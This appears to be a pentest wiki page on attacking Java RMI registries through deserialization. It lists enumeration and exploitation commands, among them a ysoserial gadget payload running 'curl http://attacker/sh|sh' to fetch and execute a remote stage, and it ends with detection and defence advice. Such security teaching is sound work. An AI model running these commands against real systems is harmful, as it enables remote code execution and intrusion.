---
title: Java RMI Registry Attacks
slug: rmi-java-attacks
---

> **TL;DR:** A Java RMI registry on TCP 1099 (or 1098, 1090, 4444) often exposes remotely invokable objects whose method arguments deserialize attacker-controlled Java, giving RCE via well-known gadget chains.

## What it is
Java Remote Method Invocation lets a client call methods on a server-side object as if it were local. The registry is a naming service that hands out remote stubs; the actual calls travel over JRMP. Because RMI uses Java native serialization for every parameter, any reachable method that accepts `Object`, `Map`, or a custom class with vulnerable readObject becomes a deserialization sink. This is the entry point behind many JBoss, WebLogic, and Tomcat-manager intrusions.

## Preconditions / where it applies
- TCP/1099 registry, plus per-object ports allocated dynamically (often 30000–65535)
- No transport-layer authentication by default; "JMX over RMI" sometimes adds a password
- Common in legacy enterprise Java stacks: JBoss EAP, WebLogic, Solr admin, GlassFish, Spring RMI exporters
- ICS HMIs and old MES systems frequently expose RMI on the OT network

## Technique
```bash
# Enumerate bound names on the registry
nmap -p 1099 --script rmi-dumpregistry 10.0.0.20

# Deeper enumeration — discovers methods on each bound object
rmiscout enum --target 10.0.0.20 --port 1099
rmg enum 10.0.0.20 1099            # remote-method-guesser
rmg guess 10.0.0.20 1099 --wordlist methods.txt

# Quick exploitation if registry itself is vulnerable (CVE-2017-3241 family)
java -jar BaRMIe.jar -enum 10.0.0.20 1099
java -jar BaRMIe.jar -attack 10.0.0.20 1099

# Ysoserial gadget over JRMP — pick a chain matching the server classpath
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker/sh|sh' > payload.bin
java -cp rmg.jar de.qtc.rmg.exploit.JRMPClient 10.0.0.20 1099 payload.bin
```

## Detection and defence
- Egress filter from app servers — gadget chains often fetch a stage over HTTP/LDAP
- Set `java.rmi.server.useCodebaseOnly=true` (default since JDK 7u21) and a strict `serialFilter`
- Bind the registry to localhost; expose business APIs over authenticated REST instead
- Patches: WebLogic CVE-2020-2883, JBoss CVE-2017-12149, Spring RMI removed in 6.x

## References
- [remote-method-guesser docs](https://github.com/qtc-de/remote-method-guesser) — modern RMI auditing tool
- [ysoserial chains](https://github.com/frohoff/ysoserial) — catalogue of Java deserialization gadgets

See also: [[exposed-services]], [[port-scanning]].
